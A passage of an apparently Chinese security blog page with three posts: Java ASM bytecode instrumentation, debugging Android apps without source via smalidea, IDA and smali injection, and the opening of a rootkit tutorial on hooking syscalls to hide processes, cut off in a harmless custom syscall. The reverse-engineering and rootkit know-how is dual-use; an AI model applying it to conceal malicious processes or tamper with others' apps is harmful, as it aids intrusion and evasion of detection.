class="keyword">byte</span>[] data = cw.toByteArray();</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">&quot;/Users/fan/Comparable.class&quot;</span>);</span><br><span class="line">        FileOutputStream fout = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">        fout.write(data);</span><br><span class="line">        fout.close();</span><br><span class="line">        <span class="comment">// 动态加载生成的class字节码</span></span><br><span class="line">        MyClassLoader myClassLoader = <span class="keyword">new</span> MyClassLoader();</span><br><span class="line">        Class c = myClassLoader.defineClass(<span class="string">&quot;com.asm5.Comparable&quot;</span>, data);</span><br><span class="line">        System.out.println(c.getName());</span><br><span class="line">        Field f[] = c.getFields();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; f.length; i++)</span><br><span class="line">            System.out.println(f[i].toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Class <span class="title">defineClass</span><span class="params">(String name, <span class="keyword">byte</span>[] b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(name, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="增加class中的方法或者变量"><a href="#增加class中的方法或者变量" class="headerlink" title="增加class中的方法或者变量"></a>增加class中的方法或者变量</h3><p>在visitEnd中增加想要增加的方法或者变量，首先，实现如下类：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.asm5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        Thread.sleep(<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>目标就是为这个类的class文件添加一个计时器，修改成如下效果：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.asm5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">long</span> timer;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException</span>&#123;</span><br><span class="line">        timer -= System.currentTimeMillis();</span><br><span class="line">        Thread.sleep(<span class="number">100</span>); </span><br><span class="line">        timer += System.currentTimeMillis();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们需要在m()方法的最前面增加指令，在RETURN指令前增加指令，同时指令必须位于xRETURN和ATHROW之前，因为这些指令都会结束方法的执行。<br>实现元素适配器：<br>AddTimeClassAdapter.java  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.asm5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.FieldVisitor;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.MethodVisitor;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.Opcodes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AddTimeClassAdapter</span> <span class="keyword">extends</span> <span class="title">ClassVisitor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String owner;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> isInterface;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AddTimeClassAdapter</span><span class="params">(ClassVisitor cv)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(Opcodes.ASM5, cv);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// visit the head of the class</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(<span class="keyword">int</span> version, <span class="keyword">int</span> access, String name, String signature,</span></span></span><br><span class="line"><span class="function"><span class="params">            String superName, String[] interfaces)</span> </span>&#123;</span><br><span class="line">        cv.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">        owner = name; <span class="comment">// the internal name of the class</span></span><br><span class="line">        isInterface = (access &amp; Opcodes.ACC_INTERFACE) != <span class="number">0</span>; <span class="comment">// 判断类是否是接口</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> access, String name, String desc, </span></span></span><br><span class="line"><span class="function"><span class="params">            String signature, String[] exceptions)</span> </span>&#123;</span><br><span class="line">        MethodVisitor mv = cv.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">        <span class="keyword">if</span> (!name.equals(<span class="string">&quot;&lt;init&gt;&quot;</span>) &amp;&amp; ! isInterface &amp;&amp; mv != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 为方法添加计时功能</span></span><br><span class="line">            mv = <span class="keyword">new</span> AddTimeMethodAdapter(mv);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> mv;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitEnd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 添加字段</span></span><br><span class="line">        <span class="keyword">if</span> (!isInterface) &#123;</span><br><span class="line">            FieldVisitor fv = cv.visitField(Opcodes.ACC_PUBLIC+Opcodes.ACC_STATIC,</span><br><span class="line">                    <span class="string">&quot;timer&quot;</span>, <span class="string">&quot;J&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">if</span> (fv != <span class="keyword">null</span>) &#123;</span><br><span class="line">                fv.visitEnd();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cv.visitEnd();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">AddTimeMethodAdapter</span> <span class="keyword">extends</span> <span class="title">MethodVisitor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">AddTimeMethodAdapter</span><span class="params">(MethodVisitor mv)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(Opcodes.ASM5, mv);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Starts the visit of the method&#x27;s code, if any(i.e. non abstract method)</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            mv.visitCode();</span><br><span class="line">            <span class="comment">// Visits a field instruction</span></span><br><span class="line">            mv.visitFieldInsn(Opcodes.GETSTATIC, owner, <span class="string">&quot;timer&quot;</span>, <span class="string">&quot;J&quot;</span>);</span><br><span class="line">            <span class="comment">// Visits a method instruction</span></span><br><span class="line">            mv.visitMethodInsn(Opcodes.INVOKESTATIC, <span class="string">&quot;java/lang/System&quot;</span>, </span><br><span class="line">                    <span class="string">&quot;currentTimeMillis&quot;</span>, <span class="string">&quot;()J&quot;</span>, isInterface);</span><br><span class="line">            <span class="comment">// Visits a zero operand instruction</span></span><br><span class="line">            mv.visitInsn(Opcodes.LSUB);</span><br><span class="line">            mv.visitFieldInsn(Opcodes.PUTSTATIC, owner, <span class="string">&quot;timer&quot;</span>, <span class="string">&quot;J&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInsn</span><span class="params">(<span class="keyword">int</span> opcode)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ((opcode &gt;= Opcodes.IRETURN &amp;&amp; opcode &lt;= Opcodes.RETURN)</span><br><span class="line">                    || opcode == Opcodes.ATHROW) &#123;</span><br><span class="line">                mv.visitFieldInsn(Opcodes.GETSTATIC, owner, <span class="string">&quot;timer&quot;</span>, <span class="string">&quot;J&quot;</span>);</span><br><span class="line">                mv.visitMethodInsn(Opcodes.INVOKESTATIC, <span class="string">&quot;java/lang/System&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;currentTimeMillis&quot;</span>, <span class="string">&quot;()J&quot;</span>, isInterface);</span><br><span class="line">                mv.visitInsn(Opcodes.LADD);</span><br><span class="line">                mv.visitFieldInsn(Opcodes.PUTSTATIC, owner, <span class="string">&quot;timer&quot;</span>, <span class="string">&quot;J&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            mv.visitInsn(opcode);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitMaxs</span><span class="params">(<span class="keyword">int</span> maxStack, <span class="keyword">int</span> maxLocal)</span> </span>&#123;</span><br><span class="line">            mv.visitMaxs(maxStack+<span class="number">4</span>, maxLocal);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>修改class字节码文件：<br>Generator.java  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.asm5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassReader;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassVisitor;</span><br><span class="line"><span class="keyword">import</span> org.objectweb.asm.ClassWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Generator</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ClassReader cr = <span class="keyword">new</span> ClassReader(<span class="string">&quot;com/asm5/C&quot;</span>);</span><br><span class="line">            <span class="comment">// ClassWriter extends ClassVisitor</span></span><br><span class="line">            ClassWriter cw = <span class="keyword">new</span> ClassWriter(ClassWriter.COMPUTE_MAXS);</span><br><span class="line">            ClassVisitor classAdapter = <span class="keyword">new</span> AddTimeClassAdapter(cw);</span><br><span class="line">            <span class="comment">// 使给定的访问者访问Java类的ClassReader</span></span><br><span class="line">            cr.accept(classAdapter, ClassReader.SKIP_DEBUG);</span><br><span class="line">            <span class="keyword">byte</span>[] data = cw.toByteArray();</span><br><span class="line">            File file = <span class="keyword">new</span> File(<span class="string">&quot;/Users/fan/Computer/Java/ASMTest/bin/com/asm5/C.class&quot;</span>);</span><br><span class="line">            FileOutputStream fout = <span class="keyword">new</span> FileOutputStream(file);</span><br><span class="line">            fout.write(data);</span><br><span class="line">            fout.close();</span><br><span class="line">            System.out.println(<span class="string">&quot;success!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是一个测试类：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.asm5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException, NoSuchFieldException,</span></span><br><span class="line"><span class="function">    SecurityException, IllegalArgumentException, IllegalAccessException </span>&#123;</span><br><span class="line">        C c = <span class="keyword">new</span> C();</span><br><span class="line">        c.m();</span><br><span class="line">        Class cc = c.getClass();</span><br><span class="line">        System.out.println(cc.getField(<span class="string">&quot;timer&quot;</span>).get(c));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出结果为：100<br>ASM工具的作用还远不止如此，这里只是为了学习写的一些简单的用法，后面会写具体的应用，用到其他功能时再补充。还有：学习一个新的技术或工具时，有官方文档一定要多看官方文档！<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://www.cnblogs.com/liuling/archive/2013/05/25/asm.html">http://www.cnblogs.com/liuling/archive/2013/05/25/asm.html</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/xysmiracle/article/details/38293795">http://blog.csdn.net/xysmiracle/article/details/38293795</a><br><a target="_blank" rel="noopener" href="http://asm.ow2.org/asm50/javadoc/user/index.html">http://asm.ow2.org/asm50/javadoc/user/index.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/02/07/JAVA-ASM%E5%AD%97%E8%8A%82%E7%A0%81%E6%A1%86%E6%9E%B6/" data-id="ckhe7o4oh007nchl7fb3rfo91" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/" rel="tag">Java</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Android无源码调试" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/01/10/Android%E6%97%A0%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/" class="article-date">
  <time datetime="2017-01-10T07:53:24.000Z" itemprop="datePublished">2017-01-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/01/10/Android%E6%97%A0%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/">Android无源码调试</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>前几天通过从网上查阅相关资料，大体了解了一些Android无源码调试的方法，本文主要总结无源码调试的三种方法：</p>
<ul>
<li>smalidea + Android Studio</li>
<li>IDA</li>
<li>插桩（Instrumentation）</li>
</ul>
<h2 id="smalidea-Android-Studio"><a href="#smalidea-Android-Studio" class="headerlink" title="smalidea + Android Studio"></a>smalidea + Android Studio</h2><p>1.安装</p>
<ul>
<li>下载插件<a target="_blank" rel="noopener" href="https://bitbucket.org/JesusFreke/smali/downloads">smalidea</a>；</li>
<li>进入Android Studio开始安装插件，进入Settings-&gt;Plugins点击<code>Install plugin from disk</code>选中下载的压缩包；</li>
<li>点击<code>apply</code>。</li>
</ul>
<p>2.开启应用调试<br>要调试一个APK的DEX中的代码，必须满足以下两个条件：</p>
<ul>
<li>APK中的AndroidManifest.xml文件中的Application标签包含属性android:debuggable=”true” (Android Studio中Build-&gt;Build APK产生的APK文件中就有这个属性)；</li>
<li>/default.prop中ro.debuggable的值为1</li>
</ul>
<p>可选方案：</p>
<ul>
<li>apktool反编译app后在AndroidManifest.xml文件中插入android:debuggable=”true”</li>
<li>hook system debug(Xinstaller)</li>
<li>修改boot.img</li>
</ul>
<p>3.调试应用<br>1）使用baksmali反编译应用：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ baksmali test.apk -o myapp&#x2F;src</span><br></pre></td></tr></table></figure>
<p>2）Android Studio导入项目：启动Android Studio-&gt;File-&gt;New-&gt;Import Project，选择上面生成的路径，选定src的上层目录<code>myapp</code>；<br>3）选择<code>Create project from existing sources</code>，一路next；<br>4）导入后，将导航栏左上角的Android改为Project；<br>5）右键src目录，即smali的顶级目录，设定Mark Directory As-&gt;Sources Root<br>6）安装应用：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adb install test.apk</span><br></pre></td></tr></table></figure>
<p>7）启动应用程序：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell am start -D -n com.example.test&#x2F;.MainActivity</span><br><span class="line">$ adb shell ps | grep test</span><br><span class="line">u0_a111   30659 181   869984 31672 ffffffff 00000000 S com.example.test</span><br><span class="line">$ adb forward tcp:8700 jdwp:30659</span><br></pre></td></tr></table></figure>
<p>8）在Android Studio设置远程调试：Run-&gt;Edit Configurations…，点左上角的<code>+</code>，选择<code>Remote</code>，设置如下：<br><img src="/images/androiddebug/config.png"><br>9）Run-&gt;Debug，触发断点之后就可以动态调试了：<br><img src="/images/androiddebug/smalidea-debug.png"><br>smalidea调试可以查看变量值（在右下角Watches中添加寄存器），但问题是单步调试跳的不准，不一定会跳到哪一步。</p>
<h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p>1.解压出APK的DEX文件classes.dex；<br>2.在IDA中加载这个DEX文件；<br>3.将光标移动到要下断点的行，按F2下断点；<br>4.打开一个Terminal：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adb shell am start -D -n com.example.test&#x2F;.MainActivity</span><br></pre></td></tr></table></figure>
<p>5.选择Debugger-&gt;Attach to process…将Debugger Attach到要调试的进程；<br><img src="/images/androiddebug/attachprocess.png"><br>6.开始运行后按F9运行程序到断点，弹出的窗口cancel掉就行了；<br><img src="/images/androiddebug/debugrun.png"><br>7.在Debugger-&gt;Debugger windows-&gt;Locals窗口中有变量，但是无法正确显示。<br><img src="/images/androiddebug/locals.png"><br>IDA调试查看不了变量值，但是每一步跳的比较准，可以结合使用这两种调试方法：IDA查看运行流程，smalidea查看变量值。</p>
<h2 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h2><p>这个方法在<a target="_blank" rel="noopener" href="http://pwn4.fun/2016/01/08/Android-Reverse-Engineering/">之前的文章</a>中介绍过，插桩的方法步骤比较复杂，但是实现的功能比较强大。而且可以在以前的基础上添加更多的方法，实现更多的功能，比如在一篇博客上看到的：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">PrintFunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Thread cur_thread = Thread.currentThread();</span><br><span class="line">    StackTraceElement stack[] = cur_thread.getStackTrace();</span><br><span class="line">    Log.d(<span class="string">&quot;bruce&quot;</span>, stack[<span class="number">3</span>].toString() + <span class="string">&quot;[&quot;</span> + cur_thread.getId() + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在需要调试的APK反编译出来的smali代码中添加一句：  </p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;&#125;, <span class="class">Lcom/bruce/BFLog;</span>-&gt;PrintFunc()V</span><br></pre></td></tr></table></figure>
<p>就可以将当前执行的函数打印出来：<br><img src="/images/androiddebug/log.png"><br>以后如果还有比较好用的方法，还会再来添加。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://wooyun.tangscan.cn/static/drops/tips-7181.html">http://wooyun.tangscan.cn/static/drops/tips-7181.html</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/CharlesSimonyi/article/details/51989096">http://blog.csdn.net/CharlesSimonyi/article/details/51989096</a><br><a target="_blank" rel="noopener" href="http://blog.csdn.net/charlessimonyi/article/details/52027563">http://blog.csdn.net/charlessimonyi/article/details/52027563</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/01/10/Android%E6%97%A0%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/" data-id="ckhe7o4k4000dchl77ubta8bi" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android/" rel="tag">Android</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Rootkit技术（一）从syscall到hook" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/01/04/Rootkit%E6%8A%80%E6%9C%AF%EF%BC%88%E4%B8%80%EF%BC%89%E4%BB%8Esyscall%E5%88%B0hook/" class="article-date">
  <time datetime="2017-01-04T07:44:45.000Z" itemprop="datePublished">2017-01-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/01/04/Rootkit%E6%8A%80%E6%9C%AF%EF%BC%88%E4%B8%80%EF%BC%89%E4%BB%8Esyscall%E5%88%B0hook/">Rootkit技术（一）从syscall到hook</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="什么是Rootkit"><a href="#什么是Rootkit" class="headerlink" title="什么是Rootkit"></a>什么是Rootkit</h2><p>简单地说，rootkit是一种能够隐身的恶意程序，也就是说，当它进行恶意活动的时候，操作系统根本感觉不到它的存在。想象一下，一个程序能够潜入到当前操作系统中，并且能够主动在进程列表中隐藏病毒，或者替换日志文件输出，或者两者兼而有之——那它就能有效地清除自身存在的证据了。此外，它还可以从受保护的内存区域中操纵系统调用，或将接口上的数据包导出到另一个接口。本文将重点介绍如何通过hooking系统调用来进行这些活动。在本文的第一部分，我们将自定义一个系统调用，然后构造一个hook到这个系统调用上的rootkit。在最后一部分，我们将创建一个rootkit来隐藏我们选择的进程。</p>
<h2 id="用户空间与内核空间"><a href="#用户空间与内核空间" class="headerlink" title="用户空间与内核空间"></a>用户空间与内核空间</h2><p>之所以要先自定义一个系统调用，就是为了理解内核空间与用户空间中到底发生了什么。在用户空间中运行的进程，对内存的访问将受到一定限制，而在内核空间运行的进程则可以访问所有内存空间。但是，用户空间的代码可以通过内核暴露的接口来访问内核空间，这里的所说的接口就是系统调用。<br>当以root身份运行进程的时候，不见得它们就会运行在内核空间。因为root用户进程仍然是一个用户空间的进程，只不过root用户的进程的UID = 0，内核验证过其身份后会赋予其超级用户权限罢了。但是，即使拥有超级用户权限，仍然需要通过系统调用接口才能请求内核的各种资源，这一点对进一步阅读下面的内容非常重要。</p>
<h2 id="所需软硬件"><a href="#所需软硬件" class="headerlink" title="所需软硬件"></a>所需软硬件</h2><p>Linux内核（我用的Ubuntu12.04，安装的内核版本为linux-3.10.103）<br>虚拟机（我用的VirtualBox）<br>我给CPU分配了两个CPU内核，4GB内存。</p>
<h2 id="创建系统调用：pname"><a href="#创建系统调用：pname" class="headerlink" title="创建系统调用：pname"></a>创建系统调用：pname</h2><p>下载Linux内核并解压到<code>/usr/src/</code>目录下：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cd &#x2F;usr&#x2F;src&#x2F;linux-3.10.103&#x2F;</span><br></pre></td></tr></table></figure>
<p>pname系统调用接收一个进程名，将该进程对应的PID返回到启动该系统调用的终端上面。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir pname</span><br><span class="line">$ cd pname</span><br><span class="line">$ vim pname.c</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/syscalls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pname.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">sys_process_name</span><span class="params">(<span class="keyword">char</span> *process_name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* tasklist struct to use */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> 